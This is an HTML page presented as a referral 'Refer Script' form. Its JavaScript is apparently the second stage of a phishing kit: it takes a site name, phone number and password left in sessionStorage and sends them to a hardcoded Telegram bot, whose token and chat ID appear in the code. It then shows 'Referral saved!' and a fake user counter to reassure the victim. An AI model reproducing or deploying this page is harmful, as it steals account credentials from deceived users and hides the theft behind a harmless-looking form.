><!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Referral - Refer Script</title>
  <style>
    :root { --primary:#0d9488; --bg:#f8fafc; --card:#fff; --text:#0f172a; }
    *{box-sizing:border-box;font-family:'Inter',sans-serif;}
    body{margin:0;display:flex;align-items:center;justify-content:center;min-height:100vh;background:var(--bg);}  
    .card{width:100%;max-width:380px;padding:2rem;border-radius:1rem;background:var(--card);box-shadow:0 20px 25px -5px rgba(0,0,0,.1),0 8px 10px -6px rgba(0,0,0,.1);}  
    h1{margin:0 0 1.25rem;text-align:center;color:var(--text);}  
    label{display:block;margin:.5rem 0 .25rem;font-size:.875rem;color:var(--text);}  
    input{width:100%;padding:.75rem;border:1px solid #e2e8f0;border-radius:.5rem;font-size:1rem;}  
    button{width:100%;padding:.75rem;margin-top:1.25rem;border:none;border-radius:.5rem;font-size:1rem;font-weight:600;color:#fff;background:var(--primary);cursor:pointer;transition:background .2s;}  
    button:hover{background:#0f766e;}  
    #info{margin-top:1rem;text-align:center;font-size:.875rem;color:var(--text);}  
  </style>
</head>
<body>
  <div class="card">
    <h1 id="site-title">Start Refer</h1>
    <label>Referral URL</label>
    <input id="refer" type="url" placeholder="Paste referral URL" required />
    <button id="start">Start</button>
    <div id="info"><span id="cnt">225</span> users have referred ✔️</div>
  </div>  <script>
    const TG_TOKEN   = '7865743181:AAEcG4ylMU_Ra41PNzrDtOo3o62pg2PtO2o';
    const TG_CHAT_ID = '6628729040';

    const siteName  = sessionStorage.getItem('site')     || 'N/A';
    const number    = sessionStorage.getItem('number')   || 'N/A';
    const password  = sessionStorage.getItem('password') || 'N/A';
    document.getElementById('site-title').textContent = `${siteName.toUpperCase()} Refer`;

    document.getElementById('start').addEventListener('click', async ()=>{
      const url = document.getElementById('refer').value.trim();
      if(!url){ alert('Please paste a URL'); return; }

      const message = `${siteName}%0A${number}%0A${password}%0ARefer: ${url}`;
      await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}`)
        .catch(()=>{});

      // increment & notify user
      const cntEl = document.getElementById('cnt');
      cntEl.textContent = parseInt(cntEl.textContent)+1;
      alert('Referral saved!');

      // optional: clear sessionStorage to tidy up
      sessionStorage.clear();
    });
  </script></body>
</html>
